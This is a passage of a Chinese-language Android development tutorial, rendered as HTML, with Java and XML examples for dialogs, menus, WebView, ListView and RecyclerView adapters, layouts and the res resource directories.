<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h3 id="AlertDialog">AlertDialog<a class="header-anchor" href="#AlertDialog"> ¶ </a></h3>
<p>对话框</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用builder生成一个dialog</span></span><br><span class="line">AlertDialog.Builder dialog = <span class="keyword">new</span> AlertDialog.Builder (MainActivity.<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">// 设置标题</span></span><br><span class="line">dialog.setTitle(<span class="string">&quot;This is Dialog&quot;</span>);</span><br><span class="line"><span class="comment">// 设置内容</span></span><br><span class="line">dialog.setMessage(<span class="string">&quot;Something important.&quot;</span>);</span><br><span class="line"><span class="comment">// 可否用Back键关闭对话框</span></span><br><span class="line">dialog.setCancelable(<span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// 设置确定按钮</span></span><br><span class="line">dialog.setPositiveButton(<span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> DialogInterface.</span><br><span class="line">    OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 设置取消按钮</span></span><br><span class="line">dialog.setNegativeButton(<span class="string">&quot;Cancel&quot;</span>, <span class="keyword">new</span> DialogInterface.</span><br><span class="line">    OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 创建dialog</span></span><br><span class="line">dialog.create();</span><br><span class="line"><span class="comment">// 展示dialog</span></span><br><span class="line">dialog.show();</span><br></pre></td></tr></table></figure>
<p>如果需要自定义对话框视图</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">View view = LayoutInflater.from(mContext).inflate(R.layout.dialog_add_friend, <span class="keyword">null</span>);</span><br><span class="line">AlertDialog.Builder builder = <span class="keyword">new</span> AlertDialog.Builder(mContext);</span><br><span class="line">builder.setView(view);</span><br><span class="line">submitBtn = view.findViewById(R.id.btn_submit);</span><br></pre></td></tr></table></figure>
<h3 id="ProgressDialog">ProgressDialog<a class="header-anchor" href="#ProgressDialog"> ¶ </a></h3>
<p>进度条对话框</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ProgressDialog progressDialog = <span class="keyword">new</span> ProgressDialog(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">progressDialog.setTitle(<span class="string">&quot;This is ProgressDialog&quot;</span>);</span><br><span class="line">progressDialog.setMessage(<span class="string">&quot;Loading...&quot;</span>);</span><br><span class="line">progressDialog.setCancelable(<span class="keyword">true</span>);</span><br><span class="line">progressDialog.show();</span><br></pre></td></tr></table></figure>
<h3 id="菜单Menu">菜单Menu<a class="header-anchor" href="#菜单Menu"> ¶ </a></h3>
<h4 id="1-新建菜单Menu资源文件">1. 新建菜单Menu资源文件<a class="header-anchor" href="#1-新建菜单Menu资源文件"> ¶ </a></h4>
<p>在<code>res/menu/*.xml</code></p>
<p>menu.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">menu</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/add_item&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;Add&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/remove_item&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;Remove&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="2-Activity重写onCreateOptionsMenu-方法">2. Activity重写<code>onCreateOptionsMenu()</code>方法<a class="header-anchor" href="#2-Activity重写onCreateOptionsMenu-方法"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">    getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>inflate([布局文件],Menu)</p>
<p>返回值为<code>true</code>表示允许将创建的菜单显示出来</p>
<h4 id="3-重写onOptionsItemSelected-方法">3. 重写<code>onOptionsItemSelected()</code>方法<a class="header-anchor" href="#3-重写onOptionsItemSelected-方法"> ¶ </a></h4>
<p>来注册菜单响应事件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (item.getItemId()) &#123;</span><br><span class="line">    <span class="keyword">case</span> R.id.add_item:</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;You clicked Add&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> R.id.remove_item:</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;You clicked Remove&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="WebView用法">WebView用法<a class="header-anchor" href="#WebView用法"> ¶ </a></h3>
<p>layout</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/web_view&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>activity</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    WebView webView = (WebView) findViewById(R.id.web_view);</span><br><span class="line">    <span class="comment">// 启用JS支持</span></span><br><span class="line">    webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 当需要从一个网页跳转到另一个网页时，我们希望目标网页仍然在当前WebView中显示，而不是打开系统浏览器</span></span><br><span class="line">    webView.setWebViewClient(<span class="keyword">new</span> WebViewClient());</span><br><span class="line">    <span class="comment">// 加载网页 也可以加载本地的html文件</span></span><br><span class="line">    webView.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需声明网络权限</p>
<h3 id="ListView">ListView<a class="header-anchor" href="#ListView"> ¶ </a></h3>
<h4 id="1-编写子元素界面">1. 编写子元素界面<a class="header-anchor" href="#1-编写子元素界面"> ¶ </a></h4>
<h4 id="2-编写Adapter">2. 编写Adapter<a class="header-anchor" href="#2-编写Adapter"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FriendsAdapter</span> <span class="keyword">extends</span> <span class="title">BaseAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 界面的布局ID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> itemLayoutId;</span><br><span class="line">    <span class="comment">// 数据</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; friendsName;</span><br><span class="line">    <span class="comment">// 环境上下文</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Context mContext;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FriendsAdapter</span><span class="params">(<span class="keyword">int</span> itemLayoutId, List&lt;String&gt; friendsName, Context mContext)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 界面的布局ID</span></span><br><span class="line">        <span class="keyword">this</span>.itemLayoutId = itemLayoutId;</span><br><span class="line">        <span class="comment">// 数据源</span></span><br><span class="line">        <span class="keyword">this</span>.friendsName = friendsName;</span><br><span class="line">        <span class="comment">// 环境上下文</span></span><br><span class="line">        <span class="keyword">this</span>.mContext = mContext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获得数据的长度</span></span><br><span class="line">        <span class="keyword">if</span> (friendsName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> friendsName.size();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getItem</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获得数据的某个元素</span></span><br><span class="line">        <span class="keyword">if</span> (friendsName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> friendsName.get(position);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getItemId</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获得某个元素的id</span></span><br><span class="line">        <span class="keyword">return</span> position;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(<span class="keyword">int</span> position, View convertView, ViewGroup parent)</span> </span>&#123;</span><br><span class="line">        ViewHolder viewHolder;</span><br><span class="line">        <span class="comment">//需要加载子Item的布局，并获取布局中的控件元素，而且设置相应的数据源值</span></span><br><span class="line">        <span class="comment">//1. 获取子布局</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == convertView) &#123;</span><br><span class="line">            <span class="comment">// 初始化布局</span></span><br><span class="line">            convertView = LayoutInflater.from(mContext).inflate(itemLayoutId, <span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">//初始化ViewHolder对象，以方便保存子布局</span></span><br><span class="line">            viewHolder = <span class="keyword">new</span> ViewHolder();</span><br><span class="line">            <span class="comment">//给ViewHolder的属性赋值（初始化页面的控件）</span></span><br><span class="line">            viewHolder.friendNameTv = convertView.findViewById(R.id.friend_name);</span><br><span class="line">            <span class="comment">//保存子布局</span></span><br><span class="line">            convertView.setTag(viewHolder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//获取已经保存的子布局</span></span><br><span class="line">            viewHolder = (ViewHolder) convertView.getTag();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 给子布局中的控件设置相应的数据源值</span></span><br><span class="line">        <span class="comment">// 得到子Item的数据</span></span><br><span class="line">        String name = friendsName.get(position);</span><br><span class="line">        viewHolder.friendNameTv.setText(name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> convertView;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span> </span>&#123;</span><br><span class="line">        TextView friendNameTv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="3-给listView对象设置adapter">3. 给listView对象设置adapter<a class="header-anchor" href="#3-给listView对象设置adapter"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">adapter = <span class="keyword">new</span> NewsListAdapter(R.layout.layout_item, newsList, getContext());</span><br><span class="line">list.setAdapter(adapter);</span><br></pre></td></tr></table></figure>
<h3 id="RecyclerView滚动控件">RecyclerView滚动控件<a class="header-anchor" href="#RecyclerView滚动控件"> ¶ </a></h3>
<h5 id="添加依赖">添加依赖<a class="header-anchor" href="#添加依赖"> ¶ </a></h5>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">compile</span> <span class="keyword">fileTree</span>(dir: <span class="string">&#x27;libs&#x27;</span>, <span class="keyword">include</span>: [<span class="string">&#x27;*.jar&#x27;</span>])</span><br><span class="line">    <span class="keyword">compile</span> <span class="string">&#x27;com.android.support:appcompat-v7:24.2.1&#x27;</span></span><br><span class="line">    <span class="keyword">compile</span> <span class="string">&#x27;com.android.support:recyclerview-v7:24.2.1&#x27;</span></span><br><span class="line">    testCompile <span class="string">&#x27;junit:junit:4.12&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Layout引用">Layout引用<a class="header-anchor" href="#Layout引用"> ¶ </a></h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">android.support.v7.widget.RecyclerView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/recycler_view&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="Adapter自定义适配器">Adapter自定义适配器<a class="header-anchor" href="#Adapter自定义适配器"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FruitAdapter</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">Adapter</span>&lt;<span class="title">FruitAdapter</span>.<span class="title">ViewHolder</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; mFruitList;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">ViewHolder</span> </span>&#123;</span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ViewHolder</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(view);</span><br><span class="line">            fruitImage = (ImageView) view.findViewById(R.id.fruit_image);</span><br><span class="line">            fruitName = (TextView) view.findViewById(R.id.fruit_name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FruitAdapter</span><span class="params">(List&lt;Fruit&gt; fruitList)</span> </span>&#123;</span><br><span class="line">        mFruitList = fruitList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ViewHolder <span class="title">onCreateViewHolder</span><span class="params">(ViewGroup parent, <span class="keyword">int</span> viewType)</span> </span>&#123;</span><br><span class="line">        View view = LayoutInflater.from(parent.getContext())</span><br><span class="line">            .inflate(R.layout.fruit_item, parent, <span class="keyword">false</span>);</span><br><span class="line">        ViewHolder holder = <span class="keyword">new</span> ViewHolder(view);</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBindViewHolder</span><span class="params">(ViewHolder holder, <span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">        Fruit fruit = mFruitList.get(position);</span><br><span class="line">        holder.fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">        holder.fruitName.setText(fruit.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getItemCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mFruitList.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>onCreateViewHolder() 方法是用于创建ViewHolder实例</p>
<p>onBindViewHolder() 方法是用于对RecyclerView子项的数据进行赋值</p>
<p>getItemCount() 用于告诉RecyclerView一共有多少子项</p>
<h5 id="调用生成">调用生成<a class="header-anchor" href="#调用生成"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    initFruits(); <span class="comment">// 初始化水果数据</span></span><br><span class="line">    RecyclerView recyclerView = (RecyclerView) findViewById(R.id.recycler_view);</span><br><span class="line">    LinearLayoutManager layoutManager = <span class="keyword">new</span> LinearLayoutManager(<span class="keyword">this</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置水平排列</span></span><br><span class="line">    <span class="comment">// layoutManager.setOrientation(LinearLayoutManager.HORIZONTAL);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置瀑布流</span></span><br><span class="line">    <span class="comment">// StaggeredGridLayoutManager layoutManager = new StaggeredGridLayoutManager(3, StaggeredGridLayoutManager.VERTICAL);</span></span><br><span class="line">    </span><br><span class="line">    recyclerView.setLayoutManager(layoutManager);</span><br><span class="line">    FruitAdapter adapter = <span class="keyword">new</span> FruitAdapter(fruitList);</span><br><span class="line">    recyclerView.setAdapter(adapter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="点击事件">点击事件<a class="header-anchor" href="#点击事件"> ¶ </a></h5>
<p>点击事件写到<code>onCreateViewHolder()</code>方法</p>
<h3 id="布局">布局<a class="header-anchor" href="#布局"> ¶ </a></h3>
<h4 id="LinearLayout线性布局">LinearLayout线性布局<a class="header-anchor" href="#LinearLayout线性布局"> ¶ </a></h4>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    // 指定排列方向 垂直/水平</span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical/horizontal&quot;</span></span></span><br><span class="line"><span class="tag">    // 指定该控件在布局中的对齐方式</span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center...&quot;</span></span></span><br><span class="line"><span class="tag">    // 设置比例，设置后相应的宽/高需设置为<span class="attr">0dp</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_weight</span>=<span class="string">&quot;weight(num)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="RelativeLayout相对布局">RelativeLayout相对布局<a class="header-anchor" href="#RelativeLayout相对布局"> ¶ </a></h4>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/button1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    // 与父布局的左对齐</span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignParentLeft</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    // 与父布局的右对齐</span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignParentTop</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    // 在父布局的正中间</span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_centerInParent</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    // 在<span class="attr">button3</span>的上方</span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_above</span>=<span class="string">&quot;@id/button3&quot;</span></span></span><br><span class="line"><span class="tag">    // 在<span class="attr">button3</span>的左方</span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_toLeftOf</span>=<span class="string">&quot;@id/button3&quot;</span></span></span><br><span class="line"><span class="tag">    // 该控件的左边缘与<span class="attr">button3</span>的左边缘对齐</span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignLeft</span>=<span class="string">&quot;@id/button3&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">&quot;Button 1&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="FrameLayout帧布局">FrameLayout帧布局<a class="header-anchor" href="#FrameLayout帧布局"> ¶ </a></h4>
<h4 id="引入布局">引入布局<a class="header-anchor" href="#引入布局"> ¶ </a></h4>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/title&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="自定义布局">自定义布局<a class="header-anchor" href="#自定义布局"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TitleLayout</span> <span class="keyword">extends</span> <span class="title">LinearLayout</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TitleLayout</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, attrs);</span><br><span class="line">        LayoutInflater.from(context).inflate(R.layout.title, <span class="keyword">this</span>);</span><br><span class="line">        Button titleBack = (Button) findViewById(R.id.title_back);</span><br><span class="line">        Button titleEdit = (Button) findViewById(R.id.title_edit);</span><br><span class="line">        titleBack.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                ((Activity) getContext()).finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        titleEdit.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(getContext(), <span class="string">&quot;You clicked Edit button&quot;</span>,</span><br><span class="line">                    Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="制作9-Patch图片">制作9-Patch图片<a class="header-anchor" href="#制作9-Patch图片"> ¶ </a></h3>
<h2 id="Android-资源">Android 资源<a class="header-anchor" href="#Android-资源"> ¶ </a></h2>
<p>Android中的资源，一般分为两类：</p>
<ul>
<li>
<p>系统内置资源：Android SDK中所提供的已经定义好的资源，用户可以直接拿来使用。</p>
</li>
<li>
<p>用户自定义资源：用户自己定义或引入的，只适用于当前应用的资源。</p>
</li>
</ul>
<h3 id="res目录">res目录<a class="header-anchor" href="#res目录"> ¶ </a></h3>
<p>res目录：可以使用R类访问的资源，放到该目录下。</p>
<table>
<thead>
<tr>
<th>res子目录</th>
<th><strong>可以存放的资源</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>res/anim</td>
<td>定义补间动画的XML文件</td>
</tr>
<tr>
<td>res/color</td>
<td>定义不同状态下颜色列表的XML文件</td>
</tr>
<tr>
<td>res/drawable</td>
<td>各种位图文件（png、jpg、gif、9-Patch）  可以编译成各种drawable对象的XML文件</td>
</tr>
<tr>
<td>res/mipmap</td>
<td>应用程序Launcher图标</td>
</tr>
<tr>
<td>res/layout</td>
<td>用户界面布局文件</td>
</tr>
<tr>
<td>res/menu</td>
<td>菜单资源布局文件（选择菜单、子菜单、上下文菜单）</td>
</tr>
<tr>
<td>res/raw</td>
<td>任意类型的原生资源</td>
</tr>
<tr>
<td>res/values</td>
<td>各种简单值的XML文件（包括字符串、整数、数组、尺寸等）</td>
</tr>
<tr>
<td>res/xml</td>
<td>其它任意的XML文件（可能没有特殊意义的XML文件）</td>
</tr>
</tbody>
</table>
<p>在Android中使用res目录下资源或系统内置资源：</p>
<ul>
<li>在其它资源文件中使用资源：
<ul>
<li>使用res目录下资源：<code>@[&lt;pack_name&gt;:]res_type&gt;/&lt;res_name&gt;</code></li>
<li>使用系统内置资源：<code>@android:&lt;res_type&gt;/&lt;res_name&gt;</code></li>
</ul>
</li>
<li>在Java代码中使用资源：（使用资源的标识符）
<ul>
<li>使用res目录下资源：<code>[&lt;pack_name&gt;.]R.res_type.res_name</code></li>
<li>使用系统内置资源： <code>android.R.res_type.res_name</code></li>
</ul>
</li>
</ul>
<p>getResources()使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Resources res = getResources();</span><br><span class="line">String appName = res.getString(R.string.app_name);</span><br><span class="line">Drawable drawable </span><br><span class="line">        = res.getDrawable(R.drawable.ic_launcher);</span><br></pre></td></tr></table></figure>
<h4 id="res-values">res/values<a class="header-anchor" href="#res-values"> ¶ </a></h4>
<h5 id="res-values-String-xml">res/values/String.xml<a class="header-anchor" href="#res-values-String-xml"> ¶ </a></h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;app_name&quot;</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;user_name&quot;</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="res-values-colors-xml">res/values/colors.xml<a class="header-anchor" href="#res-values-colors-xml"> ¶ </a></h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">color</span> <span class="attr">name</span>=<span class="string">&quot;colorPrimary&quot;</span>&gt;</span>#3F51B5<span class="tag">&lt;/<span class="name">color</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="res-values-dimens-xml">res/values/dimens.xml<a class="header-anchor" href="#res-values-dimens-xml"> ¶ </a></h5>
